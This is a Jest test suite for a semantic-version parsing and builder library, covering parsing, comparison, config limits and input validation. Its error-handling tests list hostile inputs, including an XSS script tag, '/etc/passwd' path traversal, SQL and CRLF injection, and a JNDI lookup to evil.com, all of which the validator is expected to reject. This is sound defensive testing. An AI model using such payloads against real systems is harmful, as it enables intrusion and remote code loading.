import {
  IEnhancedSemanticVersionProvider,
  ISemVerProvider,
  ISemanticVersionProvider,
} from './providers';
import { SemanticVersionBuilder } from './builders';
import { SemanticVersionService } from './SemanticVersion';
import { MAX_SEMVER_LENGTH } from '../../utils';

describe('SemanticVersionBuilder', () => {
  // Helper function to create a mock provider
  const createMockProvider = (version: string): ISemVerProvider => ({
    version,
  });

  beforeEach(() => {
    // Only clear mocks if you're actually using them
    jest.clearAllMocks();
  });

  // Helper function to reduce duplication
  const assertSemVerInfo = (
    actual: IEnhancedSemanticVersionProvider,
    expected: ISemanticVersionProvider,
  ) => {
    expect(actual.semVer).toBe(expected.semVer);
    expect(actual.major).toBe(expected.major);
    expect(actual.minor).toBe(expected.minor);
    expect(actual.patch).toBe(expected.patch);
    expect(actual.version).toBe(expected.version);
    expect(actual.semVerSuffix).toBe(expected.semVerSuffix);
  };

  // Test data factory to improve maintainability
  const createTestCase = (
    input: string,
    expected: ISemanticVersionProvider,
    description: string,
  ) => ({ input, expected, description });

  describe('Builder Pattern', () => {
    describe('construction methods', () => {
      it('should create service using fromVersion', () => {
        const service = SemanticVersionBuilder.fromVersion('1.2.3').build();
        expect(service.semVerInfo.version).toBe('1.2.3');
      });

      it('should create service using fromProvider', () => {
        const provider = createMockProvider('1.2.3');
        const service = SemanticVersionBuilder.fromProvider(provider).build();
        expect(service.semVerInfo.version).toBe('1.2.3');
      });

      it('should create service using create() and withVersion()', () => {
        const service = SemanticVersionBuilder.create().withVersion('1.2.3').build();
        expect(service.semVerInfo.version).toBe('1.2.3');
      });

      it('should create service using create() and withVersionProvider()', () => {
        const provider = createMockProvider('1.2.3');
        const service = SemanticVersionBuilder.create().withVersionProvider(provider).build();
        expect(service.semVerInfo.version).toBe('1.2.3');
      });

      it('should throw error when building without version provider', () => {
        expect(() => {
          SemanticVersionBuilder.create().build();
        }).toThrow('Version provider is required. Use withVersionProvider() or withVersion()');
      });
    });

    describe('configuration methods', () => {
      it('should apply custom configuration using fluent methods', () => {
        const service = SemanticVersionBuilder.fromVersion('1.2.3')
          .withMaxLength(50)
          .withMaxVersionNumber(100)
          .withControlCharacters(true)
          .build();

        expect(service.semVerInfo.version).toBe('1.2.3');
      });

      it('should apply configuration object', () => {
        const config = {
          maxLength: 100,
          allowControlCharacters: true,
          maxVersionNumber: 1000,
        };

        const service = SemanticVersionBuilder.fromVersion('1.2.3').withConfig(config).build();

        expect(service.semVerInfo.version).toBe('1.2.3');
      });

      it('should use custom regex for validation', () => {
        const strictRegex = /^(\d+)\.(\d+)\.(\d+)$/; // Only allows x.y.z format

        expect(() => {
          SemanticVersionBuilder.fromVersion('1.2.3-alpha') // This should fail with strict regex
            .withCustomRegex(strictRegex)
            .build();
        }).toThrow('Given Semantic Version is not valid');

        // But this should work
        const service = SemanticVersionBuilder.fromVersion('1.2.3')
          .withCustomRegex(strictRegex)
          .build();

        expect(service.semVerInfo.version).toBe('1.2.3');
      });
    });
  });

  describe('Enhanced semVerInfo', () => {
    // Valid test cases with parametrized testing
    describe('valid semver parsing', () => {
      const validTestCases = [
        createTestCase(
          'v0.10.6',
          {
            majorMinorPatch: '0.10.6',
            majorMinor: '0.10',
            major: '0',
            minor: '10',
            patch: '6',
            semVer: '0.10.6',
            semVerSuffix: '',
            version: '0.10.6',
          },
          'with "v" prefix',
        ),
        createTestCase(
          'v0.10.6-PullRequest38.2',
          {
            majorMinorPatch: '0.10.6',
            majorMinor: '0.10',
            major: '0',
            minor: '10',
            patch: '6',
            semVer: '0.10.6-PullRequest38.2',
            semVerSuffix: '-PullRequest38.2',
            version: '0.10.6',
          },
          'with "v" prefix and suffix',
        ),
        createTestCase(
          '0.10.6',
          {
            majorMinorPatch: '0.10.6',
            majorMinor: '0.10',
            major: '0',
            minor: '10',
            patch: '6',
            semVer: '0.10.6',
            semVerSuffix: '',
            version: '0.10.6',
          },
          'without "v" prefix',
        ),
        createTestCase(
          '0.10.6-PullRequest38.2',
          {
            majorMinorPatch: '0.10.6',
            majorMinor: '0.10',
            major: '0',
            minor: '10',
            patch: '6',
            semVer: '0.10.6-PullRequest38.2',
            semVerSuffix: '-PullRequest38.2',
            version: '0.10.6',
          },
          'without "v" prefix but with suffix',
        ),
        // Add edge cases for better coverage
        createTestCase(
          'v1.0.0-alpha.1',
          {
            majorMinorPatch: '1.0.0',
            majorMinor: '1.0',
            major: '1',
            minor: '0',
            patch: '0',
            semVer: '1.0.0-alpha.1',
            semVerSuffix: '-alpha.1',
            version: '1.0.0',
          },
          'with alpha pre-release',
        ),
        createTestCase(
          '2.1.3-beta.2+build.123',
          {
            majorMinorPatch: '2.1.3',
            majorMinor: '2.1',
            major: '2',
            minor: '1',
            patch: '3',
            semVer: '2.1.3-beta.2+build.123',
            semVerSuffix: '-beta.2+build.123',
            version: '2.1.3',
          },
          'with pre-release and build metadata',
        ),
      ];

      // Use test.each for parametrized testing to reduce duplication
      test.each(validTestCases)(
        'should correctly parse semver $description',
        ({ input, expected }) => {
          const service = SemanticVersionBuilder.fromVersion(input).build();
          const result = service.semVerInfo;
          assertSemVerInfo(result, expected);
        },
      );
    });

    // Test fluent comparison methods
    describe('fluent comparison methods', () => {
      let version1: IEnhancedSemanticVersionProvider;
      let version2: IEnhancedSemanticVersionProvider;
      let version3: IEnhancedSemanticVersionProvider;

      beforeEach(() => {
        version1 = SemanticVersionBuilder.fromVersion('2.1.0').build().semVerInfo;
        version2 = SemanticVersionBuilder.fromVersion('1.9.5').build().semVerInfo;
        version3 = SemanticVersionBuilder.fromVersion('2.1.0').build().semVerInfo;
      });

      it('should compare versions correctly with isGreaterThan', () => {
        expect(version1.isGreaterThan(version2)).toBe(true);
        expect(version2.isGreaterThan(version1)).toBe(false);
        expect(version1.isGreaterThan('1.5.0')).toBe(true);
        expect(version1.isGreaterThan('3.0.0')).toBe(false);
      });

      it('should compare versions correctly with isLessThan', () => {
        expect(version2.isLessThan(version1)).toBe(true);
        expect(version1.isLessThan(version2)).toBe(false);
        expect(version1.isLessThan('3.0.0')).toBe(true);
        expect(version1.isLessThan('1.0.0')).toBe(false);
      });

      it('should compare versions correctly with isEqualTo', () => {
        expect(version1.isEqualTo(version3)).toBe(true);
        expect(version1.isEqualTo(version2)).toBe(false);
        expect(version1.isEqualTo('2.1.0')).toBe(true);
        expect(version1.isEqualTo('2.1.1')).toBe(false);
      });

      it('should check compatibility with isCompatibleWith', () => {
        expect(version1.isCompatibleWith('2.0.5')).toBe(true);
        expect(version1.isCompatibleWith('2.9.9')).toBe(true);
        expect(version1.isCompatibleWith('1.9.9')).toBe(false);
        expect(version1.isCompatibleWith('3.0.0')).toBe(false);
      });
    });

    // Test fluent manipulation methods
    describe('fluent manipulation methods', () => {
      let baseVersion: IEnhancedSemanticVersionProvider;

      beforeEach(() => {
        baseVersion = SemanticVersionBuilder.fromVersion('1.2.3').build().semVerInfo;
      });

      it('should increment major version correctly', () => {
        const newVersion = baseVersion.incrementMajor();
        expect(newVersion.semVer).toBe('2.0.0');
        expect(newVersion.major).toBe('2');
        expect(newVersion.minor).toBe('0');
        expect(newVersion.patch).toBe('0');
      });

      it('should increment minor version correctly', () => {
        const newVersion = baseVersion.incrementMinor();
        expect(newVersion.semVer).toBe('1.3.0');
        expect(newVersion.major).toBe('1');
        expect(newVersion.minor).toBe('3');
        expect(newVersion.patch).toBe('0');
      });

      it('should increment patch version correctly', () => {
        const newVersion = baseVersion.incrementPatch();
        expect(newVersion.semVer).toBe('1.2.4');
        expect(newVersion.major).toBe('1');
        expect(newVersion.minor).toBe('2');
        expect(newVersion.patch).toBe('4');
      });

      it('should add suffix correctly', () => {
        const alphaVersion = baseVersion.withSuffix('alpha.1');
        expect(alphaVersion.semVer).toBe('1.2.3-alpha.1');
        expect(alphaVersion.semVerSuffix).toBe('-alpha.1');

        const betaVersion = baseVersion.withSuffix('-beta.2');
        expect(betaVersion.semVer).toBe('1.2.3-beta.2');
        expect(betaVersion.semVerSuffix).toBe('-beta.2');

        const buildVersion = baseVersion.withSuffix('+build.123');
        expect(buildVersion.semVer).toBe('1.2.3+build.123');
        expect(buildVersion.semVerSuffix).toBe('+build.123');
      });

      it('should remove suffix correctly', () => {
        const versionWithSuffix =
          SemanticVersionBuilder.fromVersion('1.2.3-alpha.1+build.123').build().semVerInfo;

        const cleanVersion = versionWithSuffix.withoutSuffix();
        expect(cleanVersion.semVer).toBe('1.2.3');
        expect(cleanVersion.semVerSuffix).toBe('');
      });

      it('should preserve suffix when incrementing with suffix', () => {
        const versionWithSuffix =
          SemanticVersionBuilder.fromVersion('1.2.3-alpha.1').build().semVerInfo;

        const majorIncrement = versionWithSuffix.incrementMajor();
        expect(majorIncrement.semVer).toBe('2.0.0-alpha.1');
      });
    });

    // Test utility methods
    describe('utility methods', () => {
      it('should detect prerelease versions', () => {
        const stableVersion = SemanticVersionBuilder.fromVersion('1.0.0').build().semVerInfo;
        const prereleaseVersion =
          SemanticVersionBuilder.fromVersion('1.0.0-alpha.1').build().semVerInfo;
        const buildVersion =
          SemanticVersionBuilder.fromVersion('1.0.0+build.123').build().semVerInfo;

        expect(stableVersion.isPrerelease()).toBe(false);
        expect(prereleaseVersion.isPrerelease()).toBe(true);
        expect(buildVersion.isPrerelease()).toBe(false);
      });

      it('should detect build metadata', () => {
        const stableVersion = SemanticVersionBuilder.fromVersion('1.0.0').build().semVerInfo;
        const buildVersion =
          SemanticVersionBuilder.fromVersion('1.0.0+build.123').build().semVerInfo;
        const prereleaseWithBuild =
          SemanticVersionBuilder.fromVersion('1.0.0-alpha+build.123').build().semVerInfo;

        expect(stableVersion.hasBuildMetadata()).toBe(false);
        expect(buildVersion.hasBuildMetadata()).toBe(true);
        expect(prereleaseWithBuild.hasBuildMetadata()).toBe(true);
      });

      it('should convert to string correctly', () => {
        const version = SemanticVersionBuilder.fromVersion('1.2.3-alpha.1').build().semVerInfo;
        expect(version.toString()).toBe('1.2.3-alpha.1');
        expect(`${version}`).toBe('1.2.3-alpha.1');
      });

      it('should serialize to JSON correctly', () => {
        const version = SemanticVersionBuilder.fromVersion('1.2.3-alpha.1').build().semVerInfo;
        const json = version.toJSON();

        expect(json).toEqual({
          semVer: '1.2.3-alpha.1',
          major: '1',
          minor: '2',
          patch: '3',
          version: '1.2.3',
          majorMinor: '1.2',
          majorMinorPatch: '1.2.3',
          semVerSuffix: '-alpha.1',
        });
      });
    });

    // Invalid input tests with better security considerations
    describe('error handling', () => {
      const nullishTestCases = [
        {
          input: '',
          description: 'empty string',
          expectedError: 'Semantic version string cannot be empty',
        },
        {
          input: null as any,
          description: 'null',
          expectedError: 'Semantic version string cannot be empty',
        },
        {
          input: undefined as any,
          description: 'undefined',
          expectedError: 'Semantic version string cannot be empty',
        },
        {
          input: ' ',
          description: 'whitespace only',
          expectedError: 'Semantic version string cannot be empty',
        },
        {
          input: '\t\n',
          description: 'tabs and newlines',
          expectedError: 'Given Semantic Version is not valid',
        },
      ];

      test.each(nullishTestCases)(
        'should throw error when input is $description',
        ({ input, expectedError }) => {
          expect(() => {
            SemanticVersionBuilder.fromVersion(input).build();
          }).toThrow(expectedError);
        },
      );

      // Security-focused invalid input tests
      const maliciousInputs = [
        { input: 'linux/amd64', description: 'platform string' },
        { input: 'linux/arm64', description: 'architecture string' },
        { input: '123456789', description: 'plain number' },
        { input: ",./<>?;'[]{}\\|", description: 'special characters' },
        { input: '<script>alert("xss")</script>', description: 'XSS attempt' },
        { input: '../../../etc/passwd', description: 'path traversal' },
        { input: 'DROP TABLE versions;', description: 'SQL injection attempt' },
        { input: '${jndi:ldap://evil.com/a}', description: 'JNDI injection' },
        { input: 'A'.repeat(10000), description: 'extremely long string' },
        { input: '1.2.3\x00.4', description: 'null byte injection' },
        { input: '1.2.3\r\n4.5.6', description: 'CRLF injection' },
      ];

      test.each(maliciousInputs)(
        'should safely handle malicious input: $description',
        ({ input }) => {
          expect(() => {
            SemanticVersionBuilder.fromVersion(input).build();
          }).toThrow('Given Semantic Version is not valid');
        },
      );

      // Test for potential DoS through regex catastrophic backtracking
      it('should handle complex patterns without performance degradation', () => {
        const complexInput = '1.2.3-' + 'a'.repeat(1000) + '.beta';
        const startTime = Date.now();

        expect(() => {
          SemanticVersionBuilder.fromVersion(complexInput).build();
        }).toThrow();

        const executionTime = Date.now() - startTime;
        // Ensure parsing doesn't take more than 100ms
        expect(executionTime).toBeLessThan(100);
      });

      it('should respect custom length limits', () => {
        const longVersion = '1.2.3-' + 'a'.repeat(300);

        expect(() => {
          SemanticVersionBuilder.fromVersion(longVersion).withMaxLength(50).build();
        }).toThrow('Given Semantic Version is not valid');
      });

      it('should respect custom version number limits', () => {
        expect(() => {
          SemanticVersionBuilder.fromVersion('1000.0.0').withMaxVersionNumber(999).build();
        }).toThrow('Given Semantic Version is not valid');
      });
    });

    // Performance test for large batches
    describe('performance', () => {
      it('should handle batch processing efficiently', () => {
        const testInputs = ['v1.0.0', '2.1.3-alpha', '0.0.1-beta.1', 'v3.2.1-rc.1+build.123'];

        const startTime = process.hrtime.bigint();

        // Process 1000 iterations to test performance
        for (let i = 0; i < 1000; i++) {
          const input = testInputs[i % testInputs.length];
          if (typeof input !== 'undefined') {
            const service = SemanticVersionBuilder.fromVersion(input).build();
            void service.semVerInfo;
          }
        }

        const endTime = process.hrtime.bigint();
        const executionTimeMs = Number(endTime - startTime) / 1_000_000;

        // Should process 1000 items in under 1000ms (generous for CI + local variance)
        expect(executionTimeMs).toBeLessThan(1000);
      });

      it('should cache parsed semVerInfo for repeated access', () => {
        const service = SemanticVersionBuilder.fromVersion('1.2.3').build();

        const firstAccess = service.semVerInfo;
        const secondAccess = service.semVerInfo;

        // Should return the same instance (cached)
        expect(firstAccess).toBe(secondAccess);
      });
    });

    // Reliability tests for edge cases
    describe('reliability edge cases', () => {
      const edgeCases = [
        { input: 'v0.0.0', description: 'minimum version' },
        { input: '999.999.999', description: 'maximum reasonable version' },
        { input: '1.0.0-0', description: 'numeric pre-release' },
        { input: '1.0.0+20130313144700', description: 'build metadata only' },
        {
          input: '1.0.0-beta-a.b-c-somethinglong+metadata+meta',
          description: 'complex pre-release',
        },
      ];

      test.each(edgeCases)('should handle edge case: $description', ({ input }) => {
        expect(() => {
          SemanticVersionBuilder.fromVersion(input).build();
        }).not.toThrow();
      });
    });

    // Type safety tests
    describe('type safety', () => {
      it('should return object with correct enhanced interface structure', () => {
        const service = SemanticVersionBuilder.fromVersion('1.2.3').build();
        const result = service.semVerInfo;

        // Basic properties
        expect(result).toHaveProperty('semVer');
        expect(result).toHaveProperty('major');
        expect(result).toHaveProperty('minor');
        expect(result).toHaveProperty('patch');
        expect(result).toHaveProperty('version');
        expect(result).toHaveProperty('semVerSuffix');

        // Enhanced methods
        expect(result).toHaveProperty('isGreaterThan');
        expect(result).toHaveProperty('isLessThan');
        expect(result).toHaveProperty('isEqualTo');
        expect(result).toHaveProperty('isCompatibleWith');
        expect(result).toHaveProperty('incrementMajor');
        expect(result).toHaveProperty('incrementMinor');
        expect(result).toHaveProperty('incrementPatch');
        expect(result).toHaveProperty('withSuffix');
        expect(result).toHaveProperty('withoutSuffix');
        expect(result).toHaveProperty('isPrerelease');
        expect(result).toHaveProperty('hasBuildMetadata');
        expect(result).toHaveProperty('toString');
        expect(result).toHaveProperty('toJSON');

        // Type checks
        expect(typeof result.semVer).toBe('string');
        expect(typeof result.major).toBe('string');
        expect(typeof result.minor).toBe('string');
        expect(typeof result.patch).toBe('string');
        expect(typeof result.version).toBe('string');
        expect(typeof result.semVerSuffix).toBe('string');
        expect(typeof result.isGreaterThan).toBe('function');
        expect(typeof result.incrementMajor).toBe('function');
        expect(typeof result.isPrerelease).toBe('function');
      });
    });
  });

  describe('SemanticVersionService', () => {
    const createProvider = (version: any) => ({ version });

    it('should delegate all properties to semVerInfo', () => {
      const service = new SemanticVersionService(createProvider('1.2.3'));
      expect(service.version).toBe('1.2.3');
      expect(service.semVer).toBe('1.2.3');
      expect(service.major).toBe('1');
      expect(service.minor).toBe('2');
      expect(service.patch).toBe('3');
      expect(service.majorMinor).toBe('1.2');
      expect(service.majorMinorPatch).toBe('1.2.3');
      expect(service.semVerSuffix).toBe('');
    });

    it('should use config.maxLength if provided', () => {
      expect(() => {
        new SemanticVersionService(createProvider('1.2.3-' + 'a'.repeat(100)), { maxLength: 10 });
      }).toThrow('Given Semantic Version is not valid');
    });

    it('should use default maxLength if config.maxLength is not provided', () => {
      expect(() => {
        new SemanticVersionService(createProvider('1.2.3-' + 'a'.repeat(MAX_SEMVER_LENGTH + 1)));
      }).toThrow('Given Semantic Version is not valid');
    });

    it('should throw if control characters are present and not allowed', () => {
      expect(() => {
        new SemanticVersionService(createProvider('1.2.3\n'), { allowControlCharacters: false });
      }).toThrow('Given Semantic Version is not valid');
    });

    it('should allow control characters if config allows', () => {
      // Should not throw for control characters when allowed, but may fail other validations
      // Using \x08 (backspace) which is a control character but not in suspicious patterns
      expect(() => {
        new SemanticVersionService(createProvider('1.2.3\x08'), { allowControlCharacters: true });
      }).toThrow('Given Semantic Version is not valid'); // Still fails regex validation
    });

    it('should use custom regex if provided', () => {
      const customRegex = /^(\d+)\.(\d+)\.(\d+)$/;
      expect(() => {
        new SemanticVersionService(createProvider('1.2.3-alpha'), { customRegex });
      }).toThrow('Given Semantic Version is not valid');
      // Should succeed for strict match
      const service = new SemanticVersionService(createProvider('1.2.3'), { customRegex });
      expect(service.version).toBe('1.2.3');
    });

    it('should throw if major/minor/patch are not numeric', () => {
      expect(() => {
        new SemanticVersionService(createProvider('1.x.3'));
      }).toThrow('Given Semantic Version is not valid');
    });

    it('should handle custom regex with different capture groups', () => {
      // Test the else branch for default SIMPLE_SEMVER_REGEX
      const service = new SemanticVersionService(createProvider('1.2.3-alpha'));
      expect(service.version).toBe('1.2.3');
      expect(service.semVerSuffix).toBe('-alpha');
    });

    it('should handle custom regex with custom capture groups', () => {
      const customRegex = /^(\d+)\.(\d+)\.(\d+)(.*)$/;
      const service = new SemanticVersionService(createProvider('1.2.3-beta'), { customRegex });
      expect(service.version).toBe('1.2.3');
      expect(service.semVerSuffix).toBe('-beta');
    });

    it('should throw when major/minor/patch components are missing after regex match', () => {
      // Create a regex that matches but doesn't capture major/minor/patch properly
      const badRegex = /^(\d+)\.(\d+)$/; // Missing patch group
      expect(() => {
        new SemanticVersionService(createProvider('1.2'), { customRegex: badRegex });
      }).toThrow('Given Semantic Version is not valid');
    });

    it('should throw when parsed numbers result in NaN', () => {
      // This would require creating a scenario where parseInt returns NaN
      // which shouldn't happen with our regex, but we can test the branch

      // Test by mocking parseInt to return NaN
      const originalParseInt = global.parseInt;
      global.parseInt = jest.fn().mockReturnValue(NaN);

      expect(() => {
        new SemanticVersionService(createProvider('1.2.3'));
      }).toThrow('Given Semantic Version is not valid');

      global.parseInt = originalParseInt;
    });

    it('should throw if major/minor/patch are out of bounds', () => {
      expect(() => {
        new SemanticVersionService(createProvider('1000000.0.0'), { maxVersionNumber: 999999 });
      }).toThrow('Given Semantic Version is not valid');
    });

    it('should throw if major/minor/patch are negative', () => {
      expect(() => {
        new SemanticVersionService(createProvider('-1.2.3'));
      }).toThrow('Given Semantic Version is not valid');
    });

    it('should throw if regex does not match', () => {
      expect(() => {
        new SemanticVersionService(createProvider('not-a-version'));
      }).toThrow('Given Semantic Version is not valid');
    });

    it('should throw if suspicious patterns are present', () => {
      expect(() => {
        new SemanticVersionService(createProvider('<script>1.2.3</script>'));
      }).toThrow('Given Semantic Version is not valid');
      expect(() => {
        new SemanticVersionService(createProvider('1.2.3../etc/passwd'));
      }).toThrow('Given Semantic Version is not valid');
      expect(() => {
        new SemanticVersionService(createProvider('1.2.3${jndi:evil}'));
      }).toThrow('Given Semantic Version is not valid');
      expect(() => {
        new SemanticVersionService(createProvider('linux/amd64'));
      }).toThrow('Given Semantic Version is not valid');
      expect(() => {
        new SemanticVersionService(createProvider('123456'));
      }).toThrow('Given Semantic Version is not valid');
      expect(() => {
        new SemanticVersionService(createProvider('abcdef'));
      }).toThrow('Given Semantic Version is not valid');
      expect(() => {
        new SemanticVersionService(createProvider('1.2.3;DROP TABLE'));
      }).toThrow('Given Semantic Version is not valid');
    });
  });

  // Test legacy compatibility
  describe('legacy compatibility', () => {
    it('should work with createSemVerService factory function', () => {
      // eslint-disable-next-line @typescript-eslint/no-require-imports
      const { createSemVerService } = require('./builders/SemanticVersionBuilder');
      const provider = createMockProvider('1.2.3');
      const service = createSemVerService(provider);

      expect(service.semVerInfo.version).toBe('1.2.3');
      expect(service.semVerInfo.isGreaterThan).toBeDefined();
    });

    it('should maintain interface compatibility', () => {
      const service = SemanticVersionBuilder.fromVersion('1.2.3').build();

      // Should still work as ISemanticVersionProvider
      expect(service.semVerInfo.version).toBe('1.2.3');
      expect(service.semVerInfo.semVer).toBe('1.2.3');
      expect(service.semVerInfo.major).toBe('1');
      expect(service.semVerInfo.minor).toBe('2');
      expect(service.semVerInfo.patch).toBe('3');
    });

    it('should work with createSemVerService from SemanticVersion module', () => {
      // eslint-disable-next-line @typescript-eslint/no-require-imports
      const { createSemVerService } = require('./SemanticVersion');
      const provider = createMockProvider('2.5.8');
      const service = createSemVerService(provider);

      expect(service.semVerInfo.version).toBe('2.5.8');
      expect(service.semVerInfo.major).toBe('2');
    });
  });

  describe('custom regex edge cases', () => {
    it('should parse valid version with custom regex through custom branch', () => {
      const customRegex = /^(\d+)\.(\d+)\.(\d+)$/;
      const service = new SemanticVersionService(createMockProvider('4.5.6'), { customRegex });
      expect(service.semVerInfo.version).toBe('4.5.6');
    });

    it('should reject non-numeric version components with custom regex', () => {
      const customRegex = /^([^.]+)\.([^.]+)\.([^.]+)$/;
      expect(() => {
        new SemanticVersionService(createMockProvider('1a.2b.3c'), { customRegex });
      }).toThrow('Given Semantic Version is not valid');
    });
  });
});
